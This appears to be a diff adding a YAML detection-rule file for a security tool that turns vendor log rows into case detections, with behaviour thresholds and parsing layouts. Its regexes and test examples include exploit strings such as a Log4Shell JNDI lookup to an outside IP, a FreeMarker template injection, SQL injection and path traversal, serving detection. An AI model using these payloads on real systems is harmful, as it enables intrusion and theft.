@@ -1,0 +1,466 @@
+# Detection rules for LOG DATA attached to a case (services/fusion/external_logs.py).
+#
+# Fusion takes DETECTIONS from attached logs, never the flat rows: a row enters
+# the case graph only when a rule here (or the row's own stated severity) says
+# it is one. Every other row stays searchable from chat and is never sent to a
+# model. Re-read when the file changes; a box can add rules or switch shipped
+# ones off in <data>/external_log_rules.local.yaml (same format, plus
+# `disable: [rule-id, ...]`).
+#
+# RULES OF THE ROAD
+# - Deterministic: a field name and a value pattern, nothing inferred.
+# - A rule names a product's OWN verdict (its detection engine already decided)
+#   or a generic shape; it never invents severity from an ordinary event.
+# - Every rule proves itself: `fires` rows must match, `quiet` rows must not.
+#   They run in tests/test_external_log_rules.py -- a rule without both fails it.
+#
+# native: the verdict the product itself wrote.
+#   fields:   column names, compared on letters+digits only and also as the last
+#             part of a dotted name ("debugContext.debugData.threatSuspected"),
+#             and as keys inside nested JSON (a list of findings in one column).
+#   match:    regex, case-insensitive, against the whole value.
+#   severity: what a hit is worth (medium / high / critical). The row's own
+#             stated severity wins when it is higher.
+
+version: 1
+
+native:
+
+  - id: threat-flag
+    reason: "the product flagged the event itself (a threat / malicious boolean)"
+    fields: [threatSuspected, isThreat, threatDetected, isMalicious, malicious]
+    match: 'true|1|yes'
+    severity: high
+    examples:
+      fires: [{debugContext.debugData.threatSuspected: "true"}, {isMalicious: 1}]
+      quiet: [{debugContext.debugData.threatSuspected: "false"}, {malicious: "no"}]
+
+  - id: malicious-verdict
+    reason: "the product's verdict or classification names a malicious kind"
+    # Not a severity column: confidenceLevel is how sure a classifier is (M365's
+    # ConfidenceLevel is "High" on a clean, delivered mail); it counts only as a verdict.
+    fields: [verdict, confidenceLevel, classification, threatClassification, threatType, threatTypes,
+             threatCategory, malwareCategory, category, categories, urlcat, urlCategory, scanResult, result]
+    match: 'malicious|malware|phish(ing)?|ransomware|trojan|backdoor|exploit|botnet|spyware|keylogger|worm|virus|rootkit|cryptomin(er|ing)|command[ -]and[ -]control|c2|malicious (content|sites?|urls?)|phishing ?(and|&) ?fraud|malware sites?'
+    severity: high
+    examples:
+      fires: [{confidenceLevel: "malicious"}, {threatsInfoMap.classification: "phish"}, {category: "Malicious"},
+              {properties.ThreatTypes: "Phishing"}, {UrlCategory: "Phishing & Fraud"}, {scanResult: "malicious", category: "Compromised"},
+              {result: "malicious", fileName: "invoice.docm"},
+              {urlcat: "Malicious Content"}, {categories: "Malware"}]
+      quiet: [{category: "Business and Economy"}, {verdict: "benign"}, {classification: "Malware Protection Update"},
+              {properties.ThreatTypes: "None", properties.ConfidenceLevel: "High"}, {scanResult: "clean"},
+              {result: "safe"}, {result: "FAILURE"}, {outcome.result: "SUCCESS"}]
+
+  - id: suspicious-verdict
+    reason: "the product's verdict says suspicious / potentially unwanted"
+    fields: [verdict, confidenceLevel, classification, threatClassification, category]
+    match: 'suspicious|pua|pup|potentially unwanted( application| program)?|grayware|riskware|adware'
+    severity: medium
+    examples:
+      fires: [{confidenceLevel: "suspicious"}, {classification: "PUA"}]
+      quiet: [{confidenceLevel: "n/a"}, {category: "Software Updates"}]
+
+  - id: identity-risk-state
+    reason: "the identity provider marked the account or sign-in at risk (Entra riskState)"
+    fields: [riskState]
+    match: 'atRisk|confirmedCompromised'
+    severity: high
+    examples:
+      fires: [{riskState: "atRisk"}, {riskState: "confirmedCompromised"}]
+      quiet: [{riskState: "none"}, {riskState: "dismissed"}, {riskState: "remediated"}]
+
+  - id: identity-risk-event
+    reason: "the identity provider attached a risk detection to the sign-in (Entra riskEventTypes)"
+    fields: [riskEventTypes, riskEventTypes_v2, riskEventType]
+    match: '(?!none$|\[\]$).+'
+    severity: medium
+    examples:
+      fires: [{riskEventTypes_v2: "unfamiliarFeatures"}, {riskEventType: "anonymizedIPAddress"}]
+      quiet: [{riskEventTypes_v2: "none"}, {riskEventTypes: "[]"}]
+
+  - id: identity-provider-threat-event
+    reason: "the identity provider's own security event (Okta, Google Workspace, Duo, Auth0, Ping)"
+    fields: [eventType, eventName, events, name, type, reason, result, action.type]
+    match: 'security\.threat\.detected|user\.account\.lock(\.limit)?|user\.mfa\.attempt_bypass|security\.request\.blocked|user\.session\.impersonation\.(grant|initiate)|suspicious_login(_less_secure_app)?|suspicious_programmatic_login|gov_attack_warning|leaked_password|account_disabled_(password_leak|hijacked|spamming)|user_marked_fraud|fraud|pwd_leak|signup_pwd_leak|limit_wc|limit_mu|USER\.ACCESS_DENIED_BY_RISK|RISK\.EVALUATED.*HIGH'
+    severity: high
+    examples:
+      fires: [{eventType: "security.threat.detected"}, {events: '[{"type": "login", "name": "suspicious_login"}]'},
+              {reason: "user_marked_fraud"}, {type: "pwd_leak"}]
+      quiet: [{eventType: "user.session.start"}, {events: '[{"type": "login", "name": "login_success"}]'},
+              {reason: "user_approved"}, {type: "s"}]
+
+  - id: ids-notice
+    reason: "an IDS notice the sensor raised itself (Zeek notice.log `note`, Module::Name)"
+    fields: [note]
+    match: '[A-Za-z_]+::[A-Za-z_]+'
+    severity: medium
+    examples:
+      fires: [{note: "Scan::Port_Scan"}, {note: "SSL::Invalid_Server_Cert"}]
+      quiet: [{note: "Failed login"}, {notes: "Scan::Port_Scan"}]
+
+  - id: named-threat
+    reason: "the product named the threat it found (AV / IPS / proxy threat name)"
+    fields: [threatName, threat, virusName, virusFound, malwareName, malwareFamily, attack, attackName,
+             threatContentName, detection, signatureMsg, ipsSignature, avName, spywareName]
+    match: '(?!(none|n/?a|-|0|unknown|unknown threat|null|not ?found|clean|\(9999\)|allowed)$).*[A-Za-z].*'
+    severity: medium
+    # A name alone is the signal only where the product states no severity:
+    # Sophos Central fills threat on a "user auto-created" event it grades low.
+    only_without_severity: true
+    examples:
+      fires: [{threatname: "Win32.Backdoor.CobaltStrike"}, {attack: "Backdoor.Cobalt.Strike.Beacon"},
+              {"Threat/Content Name": "Cobalt Strike C2"}]
+      quiet: [{threatname: "None"}, {threat: "-"}, {threatname: "N/A"}, {threat: "Unknown Threat"}]
+
+  - id: waf-attack-score
+    reason: "the WAF scored the request as an attack (Cloudflare: 1-20 = attack)"
+    fields: [WAFAttackScore, attackScore]
+    match: '([1-9]|1[0-9]|20)'
+    severity: medium
+    examples:
+      fires: [{WAFAttackScore: 5}, {WAFAttackScore: "20"}]
+      quiet: [{WAFAttackScore: 21}, {WAFAttackScore: 99}, {WAFAttackScore: 0}]
+
+  - id: anonymizer-application
+    reason: "the firewall identified the application as an anonymizer (App-ID / application control)"
+    fields: [application, app, appName, app_name, applicationName, appid, appcat]
+    match: 'tor|tor2web|tor-browser|psiphon|ultrasurf|i2p|freegate|hotspot-shield|zeronet|torrent-?anonymizer'
+    severity: medium
+    examples:
+      fires: [{application: "tor"}, {app: "Psiphon"}]
+      quiet: [{application: "ssl"}, {application: "web-browsing"}, {app: "tortoise-svn"}]
+
+  - id: remote-access-application
+    reason: "the firewall identified a remote-access tool (often how intruders keep access)"
+    fields: [application, app, appName, app_name, applicationName, appid]
+    match: 'screenconnect|connectwise[- ]?control|anydesk|teamviewer|atera|splashtop|logmein|rustdesk|ngrok|meshcentral|simplehelp|netsupport'
+    severity: medium
+    examples:
+      fires: [{application: "screenconnect"}, {app: "AnyDesk"}]
+      quiet: [{application: "ms-rdp"}, {application: "ssh"}]
+
+  - id: mfa-weakened
+    reason: "multi-factor authentication was switched off, bypassed or removed for an account (Duo, Okta, AWS, Google)"
+    fields: [action, eventType, eventName, event.name, name, operationName, activityDisplayName, description, auth_status]
+    match: 'bypass_create|bypass_code.*|.*allow access without 2fa.*|user\.mfa\.factor\.(deactivate|reset_all)|system\.mfa\.factor\.deactivate|DeactivateMFADevice|DeleteVirtualMFADevice|2sv_disable|turn_off_2sv|.*disable.*(mfa|2fa|two[- ]?factor|2sv).*|Disable Strong Authentication'
+    severity: high
+    examples:
+      fires: [{action: "bypass_create"}, {eventType: "user.mfa.factor.deactivate"}, {eventName: "DeactivateMFADevice"},
+              {description: "Policy changed: Allow access without 2FA"}, {"event.name": "2sv_disable"}]
+      quiet: [{action: "user_update"}, {eventType: "user.mfa.factor.activate"}, {eventName: "ListMFADevices"}]
+
+  - id: exploit-payload-in-request
+    title: "Exploit payload in a request"
+    reason: "a request carries a known exploit payload (Log4Shell, template injection, SQL injection, path traversal, a shell in the URL)"
+    fields: [url, uri, request, c-uri, cs-uri-stem, cs-uri-query, http.url, url.original, url.full, requestUrl,
+             clientRequestURI, useragent, user_agent, c-useragent, cs(User-Agent), http.http_user_agent, http_user_agent,
+             uri_query, uri_path, query, query_string, request_uri, http_referer, referer, referrer, cs-referer,
+             cs(Referer), http.http_refer, cookie, http_cookie, http_x_forwarded_for, x_forwarded_for, http_x_header]
+    match: '.*(\$\{jndi:|\$%7bjndi|%24%7bjndi|\$\{(lower|upper|env|sys|date|::-)[^}]*\}|freemarker\.template\.utility\.execute|union(\s|%20|\+|/\*\*/)+(all(\s|%20|\+)+)?select|/etc/passwd|/etc/shadow|<script|%3cscript|\.\./\.\./|\.\.%2f\.\.%2f|%2e%2e%2f%2e%2e|\.\.\\\.\.\\|/bin/(ba)?sh|cmd\.exe|powershell(\.exe)?(\s|%20|\+)|/dev/tcp/|wget(\s|%20|\+)+https?:|curl(\s|%20|\+)+https?:).*'
+    severity: high
+    examples:
+      fires: [{url: "/api/v1/totp/user-backup-code/../../system/maintenance/archiving"}, {useragent: "${jndi:ldap://1.2.3.4/a}"},
+              {url: "portal.example.com/catalog-portal/ui/oauth/verify?error=&deviceUdid=${\"freemarker.template.utility.Execute\"?new()(\"id\")}"},
+              {cs-uri-query: "id=1 UNION SELECT username,password FROM users"}, {url: "/index.php?page=../../etc/passwd"}]
+      quiet: [{url: "/blog/2024/10/union-selection-results"}, {useragent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
+              {url: "/docs/../index.html"}, {url: "/static/js/app.js?v=2"}]
+
+  - id: local-account-created
+    title: "Local account created by command"
+    reason: "a command created a local account on a Linux host (persistence; SigmaHQ only sees it in SYSCALL / ADD_USER records)"
+    fields: [CommandLine, proctitle, cmdline, process.command_line]
+    match: '(sudo\s+)?(\S*/)?(useradd|adduser)\s+(?!(-h|--help)\b).+'
+    severity: medium
+    examples:
+      fires: [{proctitle: "sudo useradd malware_user"}, {CommandLine: "/sbin/useradd -d /home/svc -s /bin/bash svc"}]
+      quiet: [{proctitle: "grep -EiH useradd /var/log/auth.log"}, {CommandLine: "useradd --help"}, {CommandLine: "man adduser"}]
+
+  - id: security-service-stopped
+    title: "Security product service stopped"
+    reason: "the service of an EDR / antivirus / logging agent stopped or was disabled (Windows 7036 / 7040): blinding the defence"
+    fields: [param1, ServiceName, service_name, Service, Name]
+    match: '.*(defender|windefend|\bsense\b|sysmon|crowdstrike|csagent|falcon|sentinel ?(agent|one)|carbon ?black|cb ?defense|cylance|sophos|eset|symantec|mcafee|trellix|cisco (secure|amp|security connector)|security connector|tanium|elastic (agent|endpoint)|velociraptor|wazuh|ossec|osquery|splunk ?forwarder|nxlog|winlogbeat|qualys|rapid7|insight ?agent|tenable|nessus agent|bitdefender|kaspersky|trend ?micro|apex ?one|cortex|cyvera|traps|cybereason|malwarebytes|webroot|fortiedr|harfanglab|withsecure|f-secure|panda|avast|avg|norton).*'
+    and:
+      - fields: [param2, State, Status, StartType]
+        match: '.*(stopped|disabled|stop).*'
+    severity: high
+    examples:
+      fires: [{param1: "Cisco Security Connector Monitoring 8.4.2", param2: "stopped"},
+              {param1: "Sysmon64", param2: "disabled"}]
+      quiet: [{param1: "Cisco Security Connector Monitoring 8.4.2", param2: "running"},
+              {param1: "Windows Update", param2: "stopped"}]
+
+  - id: web-executable-upload
+    title: "Server-side code uploaded with HTTP PUT"
+    reason: "a PUT request wrote a file the web server would execute (a JSP / PHP / ASPX page, a WAR, a Tomcat session file): how web shells are planted and how CVE-2025-24813 starts"
+    fields: [uri_path, cs-uri-stem, url, uri, http.url, url.path, request_uri, c-uri]
+    match: '.*\.(jspx?|war|php\d?|phtml|aspx?|ashx|asmx|cfm|session)(\?.*)?'
+    and:
+      - fields: [http_method, method, cs-method, http.http_method, request_method, http.request.method]
+        match: 'PUT'
+    severity: high
+    examples:
+      fires: [{http_method: "PUT", uri_path: "/rpMGEH.session"}, {cs-method: "PUT", cs-uri-stem: "/uploads/cmd.jsp"}]
+      quiet: [{http_method: "GET", uri_path: "/index.jsp"}, {http_method: "PUT", uri_path: "/api/v1/items/42"},
+              {cs-method: "POST", cs-uri-stem: "/login.php"}]
+
+  - id: http-method-not-a-method
+    title: "Non-standard HTTP method"
+    reason: "HTTP methods are upper-case tokens (GET, POST, PROPFIND); a random mixed-case verb carrying a body is malware using HTTP as a covert channel"
+    # Both cases required: FortiGate's "method" is the admin login method
+    # (jsconsole, https, ssh) on rows that also carry a url. All-lower-case
+    # junk verbs are the trade.
+    fields: [http_method, method, cs-method, http.http_method, request_method, http.request.method]
+    match: '(?-i:(?=[A-Za-z]*[a-z])(?=[A-Za-z]*[A-Z])[A-Za-z]{3,})'
+    and:
+      - fields: [uri, uri_path, cs-uri-stem, url, http.url, url.path, request_uri, c-uri, url.original]
+        match: '/.*|https?://.*'
+    severity: medium
+    examples:
+      fires: [{method: "hfKyMa", uri: "/", host: "www.sysmelook.com"}, {cs-method: "cxkdRBtq", cs-uri-stem: "/x"}]
+      quiet: [{method: "GET", uri: "/"}, {method: "PROPFIND", uri: "/dav/"}, {method: "M-SEARCH", uri: "*"},
+              {method: "password", user: "root"}, {method: "jsconsole", url: "/api/v2/monitor"}]
+
+  - id: encoded-post-body
+    title: "Encoded blob POSTed to a web page"
+    reason: "a request body that is nothing but one long base64 string -- no form fields, no JSON -- is how web-shell clients and HTTP C2 send commands"
+    fields: [post_body, request_body, http.request.body.content, requestbody, cs-body]
+    match: '[A-Za-z0-9+/]{64,}={0,2}'
+    severity: medium
+    examples:
+      fires: [{post_body: "hMUlHTVEzmc+5fNbbspSRUEVsphYbAJ2Sy3CJZ9K12xyL1cRo1jrslMNWGGNnxbHB14R/CMybW0Z2+wOIuWtkDfKUG2IMpcOUutkDFdSiKo="}]
+      quiet: [{post_body: "user=admin&password=hunter2&submit=Login"}, {post_body: '{"query": "status", "page": 2}'},
+              {post_body: "c2VhcmNo"}]
+
+  - id: fortios-admin-api-bypass
+    title: "FortiOS admin API auth bypass (CVE-2022-40684)"
+    reason: "a request to FortiOS/FortiProxy's admin-user API carrying the exploit's own User-Agent: the auth-bypass that adds an SSH key to the admin account"
+    fields: [url, uri, uri_path, cs-uri-stem, http.url, url.path, request_uri, c-uri, url.original]
+    match: '(https?://)?[^/]*/api/v2/cmdb/system/admin(/.*)?'
+    and:
+      - fields: [user_agent, useragent, c-useragent, cs(user-agent), http_user_agent, http.http_user_agent,
+                 user_agent.original, requestclientapplication]
+        match: 'Report Runner|Node\.js'
+    severity: high
+    examples:
+      fires: [{url: "2.1.22.1/api/v2/cmdb/system/admin/admin", user_agent: "Report Runner", http_method: "put"}]
+      quiet: [{url: "2.1.22.1/api/v2/cmdb/system/admin/admin", user_agent: "Mozilla/5.0 (Windows NT 10.0)"},
+              {url: "fw.corp/api/v2/monitor/system/status", user_agent: "Report Runner"}]
+
+  - id: sonicwall-attack-category
+    reason: "SonicOS logs every event with a category bitmask; 32 is \"Attacks\" (port scans, floods, IPS hits). msg names it"
+    fields: [c]
+    match: '32'
+    and:
+      - fields: [sn]
+        match: '\w{6,}'
+      - fields: [m]
+        match: '\d+'
+    severity: medium
+    examples:
+      fires: [{id: "firewall", sn: "0000A0AAAA00", pri: "1", c: "32", m: "83", msg: "Probable port scan detected"}]
+      quiet: [{id: "firewall", sn: "0000A0AAAA00", pri: "6", c: "1024", m: "97", msg: "Connection Closed"},
+              {c: "32", m: "83"}]
+
+  - id: juniper-security-event
+    title: "Firewall security engine detection"
+    reason: "Juniper SRX structured syslog names the engine and verdict in its message ID: antivirus hit, ATP sandbox malware, IDP application-DDoS attack"
+    fields: [syslog_header]
+    match: '.*\b(AV_VIRUS_DETECTED\w*|AAMW_MALWARE_EVENT_LOG|IDP_APPDDOS_APP_ATTACK_EVENT|ANTIVIRUS_SCAN_\w*VIRUS\w*)\b.*'
+    severity: high
+    examples:
+      fires: [{syslog_header: "<12>1 2010-02-08T08:29:28.565Z SRX650-1 RT_UTM - AV_VIRUS_DETECTED_MT [junos@67.43.156.15"}]
+      quiet: [{syslog_header: "<12>1 2016-02-18T01:32:50.391Z srx RT_UTM - WEBFILTER_URL_PERMITTED [junos@1"},
+              {syslog_header: "<14>1 2013-12-14T16:06:59Z srx RT_FLOW - RT_FLOW_SESSION_CREATE [junos@1"}]
+
+  - id: sandbox-verdict-malicious
+    title: "Sandbox verdict: malicious"
+    reason: "Juniper ATP Cloud (AAMW) scores a file 1-10; 7 and above is malware"
+    fields: [verdict-number, verdictNumber, threat-level]
+    match: '([7-9]|10)'
+    severity: high
+    examples:
+      fires: [{verdict-number: "8", action: "BLOCK", file-category: "executable"}]
+      quiet: [{verdict-number: "2", action: "PERMIT"}]
+
+  - id: email-impersonation-held
+    title: "Impersonation mail held"
+    reason: "the mail gateway's impersonation protection (look-alike sender, display-name spoofing: business e-mail compromise) held or bounced a message"
+    fields: [Definition, policyDefinition, policy]
+    match: '.*impersonation.*'
+    and:
+      - fields: [Action, Act, action]
+        match: 'hold|hld|bounce|reject|block(ed)?|quarantine(d)?'
+    severity: medium
+    examples:
+      fires: [{Action: "Hold", Definition: "Default Impersonation Definition", Hits: "1"}]
+      quiet: [{Action: "None", Definition: "Default Impersonation Definition"},
+              {Action: "Hold", Definition: "Default Spam Definition"}]
+
+  - id: firewall-threat-detection
+    title: "Firewall threat detection / IPS event"
+    reason: "the firewall's own threat detection (rate exceeded: scanning or DoS) or built-in IPS signature fired (Cisco ASA 733100 / 4000xx)"
+    fields: [text, message, msg]
+    match: '.*%(ASA|FTD|PIX)-\d-(733100|4000\d\d|4001\d\d)\b.*'
+    severity: medium
+    examples:
+      fires: [{text: "%ASA-4-733100: [ Scanning] drop rate-1 exceeded. Current burst rate is 10 per second"},
+              {text: "%ASA-4-400013: IPS:2003 ICMP redirect from 10.0.0.1 to 10.0.0.2 on interface outside"}]
+      quiet: [{text: "%ASA-6-302013: Built outbound TCP connection 1 for outside:1.2.3.4/443"},
+              {text: "%ASA-4-106023: Deny tcp src outside:1.2.3.4/4444 dst inside:10.0.0.5/445"}]
+
+  - id: ids-alert-line-priority-1
+    title: "IDS alert (priority 1)"
+    reason: "a Snort / Suricata alert line (fast.log, syslog) the sensor itself rated priority 1"
+    fields: [text]
+    match: '.*\[\*\*\]\s*\[\d+:\d+:\d+\].*\[Priority:\s*1\].*'
+    severity: high
+    examples:
+      fires: [{text: '12/21-15:44:09.432 [**] [1:2018567:2] ET POLICY ELF file download [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 1.2.3.4:80 -> 10.0.0.5:4444'}]
+      quiet: [{text: '12/21-15:44:09.432 [**] [1:2002024:20] ET CHAT IRC NICK command [**] [Classification: Misc activity] [Priority: 3] {TCP} 10.0.0.5:4444 -> 1.2.3.4:6667'},
+              {text: 'Priority: 1 of the sprint is the login page'}]
+
+  - id: ids-alert-line-priority-2
+    title: "IDS alert (priority 2)"
+    reason: "a Snort / Suricata alert line the sensor rated priority 2"
+    fields: [text]
+    match: '.*\[\*\*\]\s*\[\d+:\d+:\d+\].*\[Priority:\s*2\].*'
+    severity: medium
+    examples:
+      fires: [{text: '[**] [1:2010935:3] ET SCAN Suspicious inbound to MSSQL port 1433 [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 1.2.3.4:1 -> 10.0.0.5:1433'}]
+      quiet: [{text: '[**] [1:2002024:20] ET CHAT IRC NICK command [**] [Classification: Misc activity] [Priority: 3] {TCP} 10.0.0.5:1 -> 1.2.3.4:6667'}]
+
+  - id: nested-severity
+    reason: "a severity written inside a nested result (Chronicle security_result, alert evidence lists)"
+    fields: [severity]
+    nested_only: true
+    match: 'high|critical'
+    severity: high
+    examples:
+      fires: [{security_result: '[{"severity": "HIGH", "rule_name": "Password spray"}]'}]
+      quiet: [{security_result: '[{"severity": "LOW"}]'}, {security_result: '[{"summary": "ok"}]'}]
+
+# behaviour: patterns only MANY rows show (services/fusion/behaviour.py). Each
+# occurrence becomes ONE detection with its counts, time span and example rows.
+# Thresholds below are the shipped defaults; a box overrides any of them in its
+# local file (`behaviour: {brute-force: {failures: 20}}`) or switches a rule off
+# (`enabled: false`, or the rule id under `disable:`). Proven by
+# tests/test_external_log_behaviour.py on attack AND clean streams.
+behaviour:
+  brute-force:      {failures: 10, window_s: 600, success_within_s: 1800, severity: medium, severity_with_success: high}
+  password-spray:   {users: 10, window_s: 1800, severity: high}
+  distributed-spray: {users: 20, sources: 3, window_s: 3600, recover_s: 1800, severity: high}
+  mfa-fatigue:      {denials: 5, window_s: 900, severity: medium, severity_with_success: high}
+  port-scan:        {ports: 25, window_s: 300, severity: medium}
+  host-sweep:       {hosts: 25, window_s: 300, severity: medium}
+  beaconing:        {connections: 20, min_span_s: 1800, max_jitter: 0.2, min_interval_s: 10, max_interval_s: 1800, severity: medium}
+  outbound-flood:   {connections: 1000, window_s: 60, severity: high}
+  inbound-remote-admin: {ports: [3389, 5900, 5985, 5986, 445, 135, 139, 23], severity: medium}
+  c2-retry:         {attempts: 200, window_s: 3600, failed_share: 0.5, severity: medium}
+  web-scan:         {paths: 50, window_s: 600, severity: medium}
+  web-login-brute-force: {posts: 20, window_s: 600, severity: medium}
+  dns-ptr-sweep:    {lookups: 100, window_s: 600, severity: medium}
+  dns-tunnel:       {subdomains: 100, window_s: 3600, long_label: 40, long_queries: 20, severity: medium}
+
+# layouts: header-less exports whose column ORDER the vendor documents. A line
+# that matches `line` is split on `delimiter` (inside the `csv` group when there
+# is one, after a syslog prefix) and named by `columns` -- the list chosen by the
+# value at `key_column` (0-based), else `default`. Data, not code: a box adds its
+# own layouts in the local file.
+layouts:
+  - id: panos-csv
+    reason: "Palo Alto PAN-OS syslog CSV (TRAFFIC / THREAT), documented field order"
+    line: '^(?:.*?\s)?(?P<csv>1,\d{4}/\d{2}/\d{2} \d{2}:\d{2}:\d{2},[^,]*,(?:TRAFFIC|THREAT|URL|WILDFIRE|DECRYPTION),.*)$'
+    delimiter: ","
+    key_column: 3
+    default: TRAFFIC
+    columns:
+      TRAFFIC: [future_use_1, receive_time, serial, type, subtype, future_use_2, generated_time, src_ip, dst_ip,
+                nat_src_ip, nat_dst_ip, policy_rule, src_user, dst_user, application, vsys, src_zone, dst_zone,
+                inbound_if, outbound_if, log_action, future_use_3, session_id, repeat_count, src_port, dst_port,
+                nat_src_port, nat_dst_port, flags, protocol, action, bytes, bytes_sent, bytes_received, packets,
+                start_time, elapsed_s, url_category, future_use_4, sequence, action_flags, src_location, dst_location]
+      THREAT: [future_use_1, receive_time, serial, type, subtype, future_use_2, generated_time, src_ip, dst_ip,
+               nat_src_ip, nat_dst_ip, policy_rule, src_user, dst_user, application, vsys, src_zone, dst_zone,
+               inbound_if, outbound_if, log_action, future_use_3, session_id, repeat_count, src_port, dst_port,
+               nat_src_port, nat_dst_port, flags, protocol, action, url, threat_content_name, category, severity,
+               direction, sequence, action_flags, src_location, dst_location, future_use_5, content_type, pcap_id,
+               file_digest, cloud, url_index, user_agent, file_type, x_forwarded_for, referer, sender, subject,
+               recipient, report_id, dg_1, dg_2, dg_3, dg_4, vsys_name, device_name, future_use_6, src_vm_uuid,
+               dst_vm_uuid, http_method]
+  - id: aws-vpcflow-v2
+    reason: "AWS VPC Flow Logs, default (version 2) format, no header. Unnamed, a REJECTed RDP attempt from the internet read as an answered one"
+    line: '^2 (\d{12}|unknown) eni-[0-9a-f]+ \S+ \S+ \S+ \S+ \S+ \S+ \S+ \d+ \d+ (ACCEPT|REJECT|-) (OK|NODATA|SKIPDATA)\s*$'
+    delimiter: " "
+    quote: none
+    empty: ["-"]
+    columns:
+      default: [version, account_id, interface_id, srcaddr, dstaddr, srcport, dstport, protocol, packets, bytes,
+                start, end, action, log_status]
+  - id: umbrella-ips-csv
+    reason: "Cisco Umbrella intrusion (IPS) log export (no header), documented field order"
+    line: '^"\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}","[^"]*","[^"]*","\d+","\d+","[^"]*","\d+","(HIGH|MEDIUM|LOW|VERY LOW)",'
+    delimiter: ","
+    columns:
+      default: [timestamp, identity, identity_type, generator_id, signature_id, signature_msg, signature_list_id,
+                severity, classification, cve, protocol, session_id, src_ip, src_port, dst_ip, dst_port, action]
+  - id: umbrella-dns-csv
+    reason: "Cisco Umbrella DNS log export (no header), documented field order"
+    line: '^"\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}","[^"]*","[^"]*","[\d.]+","[\d.]+","(?:Allowed|Blocked)"'
+    delimiter: ","
+    columns:
+      default: [timestamp, host, identities, src_ip, nat_ip, action, query_type, response_code, domain, categories,
+                most_granular_identity_type, identity_types, blocked_categories]
+  # Zeek / Bro TSV whose "#fields" header was stripped (SecRepo, many SIEM
+  # exports): the default column order of each log, Bro 2.x. More specific
+  # shapes first; conn.log last (its pattern is the loosest).
+  - id: zeek-notice-tsv
+    reason: "Zeek notice.log without its header"
+    line: '^\d{9,10}\.\d+(\t[^\t]*){9}\t[A-Za-z_]+::[A-Za-z_]+\t'
+    delimiter: "\t"
+    quote: none
+    empty: ["-", "(empty)"]
+    columns:
+      default: [ts, uid, id.orig_h, id.orig_p, id.resp_h, id.resp_p, fuid, file_mime_type, file_desc, proto, note, msg,
+                sub, src, dst, p, n, peer_descr, actions, suppress_for, dropped, remote_location.country_code,
+                remote_location.region, remote_location.city, remote_location.latitude, remote_location.longitude]
+  - id: zeek-dns-tsv
+    reason: "Zeek dns.log without its header"
+    line: '^\d{9,10}\.\d+\t\S+\t[\d.:a-fA-F]+\t\d+\t[\d.:a-fA-F]+\t\d+\t(udp|tcp)\t[\d-]+\t[^\t]*\t[\d-]+\t(C_[A-Z]+|-)\t'
+    delimiter: "\t"
+    quote: none
+    empty: ["-", "(empty)"]
+    columns:
+      default: [ts, uid, id.orig_h, id.orig_p, id.resp_h, id.resp_p, proto, trans_id, query, qclass, qclass_name, qtype,
+                qtype_name, rcode, rcode_name, AA, TC, RD, RA, Z, answers, TTLs, rejected]
+  - id: zeek-http-tsv
+    reason: "Zeek http.log without its header"
+    line: '^\d{9,10}\.\d+\t\S+\t[\d.:a-fA-F]+\t\d+\t[\d.:a-fA-F]+\t\d+\t\d+\t([A-Z_]+|-)\t'
+    delimiter: "\t"
+    quote: none
+    empty: ["-", "(empty)"]
+    columns:
+      default: [ts, uid, id.orig_h, id.orig_p, id.resp_h, id.resp_p, trans_depth, method, host, uri, referrer,
+                user_agent, request_body_len, response_body_len, status_code, status_msg, info_code, info_msg,
+                filename, tags, username, password, proxied, mime_type, md5, extraction_file]
+  - id: zeek-ssh-tsv
+    reason: "Zeek ssh.log without its header"
+    line: '^\d{9,10}\.\d+\t\S+\t[\d.:a-fA-F]+\t\d+\t[\d.:a-fA-F]+\t\d+\t(success|failure|undetermined|-)\t(INBOUND|OUTBOUND|-)\t'
+    delimiter: "\t"
+    quote: none
+    empty: ["-", "(empty)"]
+    columns:
+      default: [ts, uid, id.orig_h, id.orig_p, id.resp_h, id.resp_p, status, direction, client, server,
+                remote_location.country_code, remote_location.region, remote_location.city,
+                remote_location.latitude, remote_location.longitude]
+  - id: zeek-conn-tsv
+    reason: "Zeek conn.log without its header"
+    line: '^\d{9,10}\.\d+\t\S+\t[\d.:a-fA-F]+\t\d+\t[\d.:a-fA-F]+\t\d+\t(tcp|udp|icmp)\t[^\t]*\t([\d.]+|-)\t'
+    delimiter: "\t"
+    quote: none
+    empty: ["-", "(empty)"]
+    columns:
+      default: [ts, uid, id.orig_h, id.orig_p, id.resp_h, id.resp_p, proto, service, duration, orig_bytes, resp_bytes,
+                conn_state, local_orig, missed_bytes, history, orig_pkts, orig_ip_bytes, resp_pkts, resp_ip_bytes,
+                tunnel_parents]
